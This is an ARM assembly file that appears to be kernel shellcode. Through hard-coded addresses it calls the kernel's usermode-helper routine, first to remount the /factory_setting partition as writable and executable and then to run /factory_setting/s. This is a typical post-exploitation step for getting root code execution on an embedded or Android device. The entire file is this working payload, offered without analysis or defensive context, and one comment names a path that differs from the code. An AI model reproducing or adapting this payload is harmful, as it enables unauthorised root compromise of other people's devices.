.text
.global _start

_start:

  // call_usermodehelper_fns("/bin/mount", ["/bin/mount", "-o", "remount,rw,exec",
  //                                        "/factory_setting", 0x00],
  //                          NULL, UMH_WAIT_PROC, NULL, NULL, NULL)

  add r0, pc, #88 // mount
  add r1, pc, #95 // dasho
  add r2, pc, #94 // remount,exec
  add r3, pc, #106 // factory_setting
  mov r4, #0
  push {r0-r4}

  mov r1, sp // ["/bin/mount", "-o", "remount,rw,exec", "/factory_setting", 0x00]

  push {r4} // NULL
  push {r4} // NULL
  push {r4} // NULL

  mov r2, #0 // NULL
  ldr r3, =2 // UMH_WAIT_PROC

  ldr r4, =0xc00fa15c //=0xc00f75d0 // =0xc00fa15c // usermodehelper
  blx r4

  // call_usermodehelper_fns("/factory_setting/s", ["/data/s", 0x00],
  //                          NULL, UMH_WAIT_PROC, NULL, NULL, NULL)

  add r0, pc, #79 // shell
  add r1, pc, #75 // shell
  mov r2, #0
  push {r0-r2}

  mov r1, sp // ["/factory_setting/s", 0x00]

  push {r2} // NULL
  push {r2} // NULL
  push {r2} // NULL

  ldr r3, =2 // UMH_WAIT_PROC

  blx r4

mount:           .asciz "/bin/mount"
dasho:           .asciz "-o"
remount:         .asciz "remount,rw,exec"
factory_setting: .asciz "/factory_setting"
shell:           .asciz "/factory_setting/s"
